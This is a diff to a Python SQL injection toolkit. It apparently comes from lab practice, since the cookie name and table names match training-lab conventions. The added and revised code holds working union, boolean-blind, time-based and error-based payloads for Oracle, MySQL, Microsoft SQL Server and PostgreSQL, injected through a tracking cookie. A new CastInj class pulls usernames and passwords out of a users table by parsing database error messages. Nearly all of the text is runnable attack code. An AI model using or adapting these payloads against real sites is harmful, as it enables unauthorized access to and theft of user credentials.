@@ -1,3 +1,4 @@
+from http.client import responses
 from urllib.parse import quote
 import requests
 import difflib
@@ -27,7 +28,7 @@ def simple_sql_injection(ses, url):
     url_response = ses.get(url)
     text1 = url_response.text.splitlines()
 
-    injection = f"{url}' UNION SELECT USERNAME_EGJYLI, PASSWORD_UPDJNI FROM USERS_LBKGPF--"
+    injection = f"{url}' UNION SELECT BANNER,NULL FROM v$version--"
     injection_request = ses.get(injection)
     text2= injection_request.text.splitlines()
 
@@ -73,7 +74,7 @@ class BlindInj:
                 if self.dbms == "oracle":
                     payload = f"{self.tracking_id}' AND SUBSTR((SELECT {column} FROM {table} WHERE username = '{username}'), {i}, 1) = '{j}'--"
                 elif self.dbms == "mysql":
-                    payload = f"{self.tracking_id}' AND SUBSTRING((SELECT {column} FROM {table} WHERE username = '{username}' LIMIT 1), {i}, 1) = '{j}'--"
+                    payload = f"{self.tracking_id}' AND SUBSTRING((SELECT {column} FROM {table} WHERE username = '{username}' LIMIT 1), {i}, 1) = '{j}'-- "
                 else:
                     payload = f"{self.tracking_id}' AND SUBSTRING((SELECT {column} FROM {table} WHERE username = '{username}'), {i}, 1) = '{j}'--"
 
@@ -104,7 +105,7 @@ class BlindInj:
                 elif self.dbms == "microsoft":
                     payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN CAST(1/0 AS int) ELSE NULL END FROM {table} WHERE username='{username}')--"
                 elif self.dbms == "mysql":
-                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN 1/0 ELSE '' END FROM {table} WHERE username='{username}' LIMIT 1)--"
+                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN 1/0 ELSE '' END FROM {table} WHERE username='{username}' LIMIT 1)-- "
                 else:
                     payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN CAST(1/0 AS int) ELSE NULL END FROM {table} WHERE username='{username}')--"
 
@@ -131,7 +132,7 @@ class BlindInj:
                 elif self.dbms == "microsoft":
                     payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN 1 ELSE 0 END FROM {table} WHERE username='{username}') = 1 WAITFOR DELAY '0:0:{delay}'--"
                 elif self.dbms == "mysql":
-                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN SLEEP({delay}) ELSE 0 END FROM {table} WHERE username='{username}' LIMIT 1)--"
+                    payload = f"{self.tracking_id}' AND (SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN SLEEP({delay}) ELSE 0 END FROM {table} WHERE username='{username}' LIMIT 1)-- "
                 else:
                     payload = f"{self.tracking_id}'||(SELECT CASE WHEN SUBSTRING({column}, {i}, 1) = '{j}' THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM {table} WHERE username='{username}')||'"
 
@@ -159,7 +160,12 @@ class UnionTableRecon:
 
     def table_rekon(self):
         column = 1
-        sufix = " FROM dual--" if self.dbms == "oracle" else "--"
+        if self.dbms == "oracle":
+            sufix = " FROM dual--"
+        elif self.dbms == "mysql":
+            sufix = "-- "
+        else:
+            sufix = "--"
         injection = f"{self.url}' UNION SELECT NULL{sufix}"
         while True:
             res = self.ses.get(injection)
@@ -300,27 +306,67 @@ class InformationSchema:
     def get_columns(self, table_name='users'):
         return self._get_dif_lines(self._columns_payload(table_name))
 
-def cast_inj(ses, url):
+class CastInj:
+    def __init__(self, url, ses, column_name, table_name="users", dbms="postgresql", cookie_name="TrackingId"):
+        self.url = url
+        self.ses = ses
+        self.column_name = column_name
+        self.table_name = table_name
+        self.dbms = dbms
+        self.cookie_name = cookie_name
+        self._init_cookies()
 
-    payload_login = "'AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--"
-    payload_pass = "'AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--"
-    c = (payload_pass, payload_login)
+    def _init_cookies(self):
+        try:
+            res = self.ses.get(self.url)
+            return res.cookies.get(self.cookie_name, "")
+        except Exception:
+            return ""
 
-    for i in c:
-        cookies = {
-            "TrackingId": i
+    def cast(self):
+        payloads = {
+            "postgresql": f"' AND 1=CAST((SELECT {self.column_name} FROM {self.table_name} LIMIT 1) AS int)--",
+            "microsoft": f"' AND 1=CAST((SELECT TOP 1 {self.column_name} FROM {self.table_name}) AS int)--",
+            "mysql": f"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT {self.column_name} FROM {self.table_name} LIMIT 1)))-- ",
+            "oracle": f"' AND 1=TO_NUMBER((SELECT {self.column_name} FROM {self.table_name} FETCH FIRST 1 ROWS ONLY))--",
         }
-        response = ses.get(url, cookies=cookies)
 
-        match = re.search(r'invalid input syntax for type integer: "(.*?)"', response.text)
+        payload = payloads.get(self.dbms, payloads["postgresql"])
 
-        if match:
-            print(f"We found {match.group(1)}")
-        else:
-            print(f"Nothing found, check the payload or server response")
-            print(response.text[:1000])
+        cookies = {
+            self.cookie_name: payload
+        }
+
+        try:
+            response = self.ses.get(self.url, cookies=cookies)
+            regex_patterns = {
+                "postgresql": r'invalid input syntax for (?:type )?integer: "([^"]+)"',
+                "microsoft": r"Converting the \w+ value '([^']+)' to data type int",
+                "mysql": r"XPATH syntax error: '~([^']+)'",
+                "oracle": r'ORA-01722: invalid number.*?"([^"]+)"'  # В зависимости от конфигурации
+            }
+
+            pattern = regex_patterns.get(self.dbms, regex_patterns["postgresql"])
+            match = re.search(pattern, response.text, re.IGNORECASE)
+
+            if match:
+                found_value = match.group(1)
+                print(f"[+] [{self.dbms.upper()}] Successfully extracted: {found_value}")
+                return found_value
+
+            else:
+                print(f"[-] [{self.dbms.upper()}] Nothing found. Check response or database format.")
+                print("--- First 500 chars of response ---")
+                print(response.text[:500])
+                return None
+
+        except Exception as e:
+            print(f"[-] Request error: {e}")
+            return None
+
 
 
 if __name__ == "__main__":
-    verifier = DbmsVerifyTimeBased(base_url, session, delay=5)
-    dbms = verifier.verify()
+
+    b = BlindInj(ses = session, url = base_url)
+    b.delay_injection(20)
